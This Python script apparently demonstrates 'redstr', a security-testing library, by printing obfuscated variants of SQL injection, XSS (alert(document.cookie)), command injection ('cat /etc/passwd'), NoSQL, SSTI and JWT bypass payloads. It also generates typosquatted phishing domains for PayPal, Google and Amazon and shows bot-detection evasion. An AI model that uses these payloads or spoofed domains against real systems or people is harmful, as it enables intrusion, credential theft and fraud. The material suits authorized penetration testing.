#!/usr/bin/env python3
"""
Security testing examples for redstr Python bindings.

This script demonstrates how to use redstr for various security testing scenarios:
- WAF bypass testing
- SQL injection payload generation
- XSS payload obfuscation
- Phishing domain generation
- JWT token manipulation
"""

import redstr


def waf_bypass_examples():
    """Examples for WAF bypass testing."""
    print("\n" + "=" * 70)
    print("WAF Bypass Testing Examples")
    print("=" * 70)
    
    # SQL injection with various obfuscations
    payload = "SELECT * FROM users WHERE id=1"
    print(f"\nOriginal SQL: {payload}")
    print(f"With comments: {redstr.sql_comment_injection(payload)}")
    print(f"With case swap: {redstr.case_swap(payload)}")
    print(f"With mixed encoding: {redstr.mixed_encoding(payload)}")
    
    # Chain multiple transformations for advanced bypass
    builder = redstr.TransformBuilder(payload)
    result = builder.case_swap().url().build()
    print(f"Chained (case_swap + url): {result}")


def xss_payload_examples():
    """Examples for XSS payload obfuscation."""
    print("\n" + "=" * 70)
    print("XSS Payload Obfuscation Examples")
    print("=" * 70)
    
    payload = "alert(document.cookie)"
    print(f"\nOriginal payload: {payload}")
    print(f"XSS tag variations: {redstr.xss_tag_variations(payload)}")
    print(f"JS string concat: {redstr.js_string_concat('alert')}")
    print(f"HTML entity encoded: {redstr.html_entity_encode('<script>alert(1)</script>')}")
    print(f"Mixed encoding: {redstr.mixed_encoding(payload)}")


def sql_injection_examples():
    """Examples for SQL injection testing."""
    print("\n" + "=" * 70)
    print("SQL Injection Testing Examples")
    print("=" * 70)
    
    # Various SQL injection patterns
    payloads = [
        "' OR '1'='1",
        "admin'--",
        "1' UNION SELECT null,null--",
    ]
    
    for payload in payloads:
        print(f"\nOriginal: {payload}")
        print(f"With comments: {redstr.sql_comment_injection(payload)}")
        print(f"URL encoded: {redstr.url_encode(payload)}")
        print(f"Mixed case: {redstr.randomize_capitalization(payload)}")


def nosql_injection_examples():
    """Examples for NoSQL injection testing."""
    print("\n" + "=" * 70)
    print("NoSQL Injection Testing Examples")
    print("=" * 70)
    
    print(f"\nMongoDB injection: {redstr.mongodb_injection('admin')}")
    print(f"NoSQL operator injection: {redstr.nosql_operator_injection('value')}")
    print(f"CouchDB injection: {redstr.couchdb_injection('admin')}")
    print(f"DynamoDB obfuscate: {redstr.dynamodb_obfuscate('user')}")


def phishing_examples():
    """Examples for phishing domain generation."""
    print("\n" + "=" * 70)
    print("Phishing Domain Generation Examples")
    print("=" * 70)
    
    domains = ["paypal.com", "google.com", "amazon.com"]
    
    for domain in domains:
        print(f"\nTarget domain: {domain}")
        print(f"Typosquat: {redstr.domain_typosquat(domain)}")
        print(f"Advanced spoof: {redstr.advanced_domain_spoof(domain)}")
    
    # Email obfuscation
    email = "admin@example.com"
    print(f"\nEmail: {email}")
    print(f"Obfuscated: {redstr.email_obfuscation(email)}")


def jwt_manipulation_examples():
    """Examples for JWT token manipulation."""
    print("\n" + "=" * 70)
    print("JWT Token Manipulation Examples")
    print("=" * 70)
    
    # Sample JWT token
    jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
    
    print(f"\nOriginal JWT: {jwt[:50]}...")
    print(f"Signature bypass: {redstr.jwt_signature_bypass(jwt)[:80]}...")
    print(f"Algorithm confusion: {redstr.jwt_algorithm_confusion(jwt)[:80]}...")
    print(f"Header manipulation: {redstr.jwt_header_manipulation(jwt)[:80]}...")
    print(f"Payload obfuscate: {redstr.jwt_payload_obfuscate(jwt)[:80]}...")


def command_injection_examples():
    """Examples for command injection testing."""
    print("\n" + "=" * 70)
    print("Command Injection Testing Examples")
    print("=" * 70)
    
    commands = [
        "cat /etc/passwd",
        "ls -la",
        "whoami",
    ]
    
    for cmd in commands:
        print(f"\nCommand: {cmd}")
        print(f"Injected: {redstr.command_injection(cmd)}")
        print(f"Null byte: {redstr.null_byte_injection(cmd)}")


def bot_evasion_examples():
    """Examples for bot detection evasion."""
    print("\n" + "=" * 70)
    print("Bot Detection Evasion Examples")
    print("=" * 70)
    
    print("\nUser-Agent variations:")
    for i in range(3):
        ua = redstr.random_user_agent()
        print(f"  {i+1}. {ua[:80]}...")
    
    print("\nOther fingerprint variations:")
    print(f"TLS fingerprint: {redstr.tls_fingerprint_variation('771,4865-4866-4867')}")
    print(f"Accept-Language: {redstr.accept_language_variation('en')}")
    print(f"HTTP/2 headers: {redstr.http2_header_order('User-Agent: ...')[:60]}...")


def ssti_examples():
    """Examples for Server-Side Template Injection testing."""
    print("\n" + "=" * 70)
    print("SSTI (Server-Side Template Injection) Examples")
    print("=" * 70)
    
    payload = "{{7*7}}"
    print(f"\nOriginal: {payload}")
    print(f"SSTI injection: {redstr.ssti_injection('name')}")
    print(f"Framework variation: {redstr.ssti_framework_variation(payload)}")
    print(f"Syntax obfuscate: {redstr.ssti_syntax_obfuscate(payload)}")


def main():
    """Run all security testing examples."""
    print("=" * 70)
    print("redstr - Security Testing Examples")
    print("=" * 70)
    print("\nThis demonstrates how to use redstr for various security testing scenarios.")
    print("⚠️  Use only for authorized testing on systems you own or have permission to test.")
    
    waf_bypass_examples()
    xss_payload_examples()
    sql_injection_examples()
    nosql_injection_examples()
    phishing_examples()
    jwt_manipulation_examples()
    command_injection_examples()
    bot_evasion_examples()
    ssti_examples()
    
    print("\n" + "=" * 70)
    print("Security testing examples complete!")
    print("=" * 70)


if __name__ == "__main__":
    main()
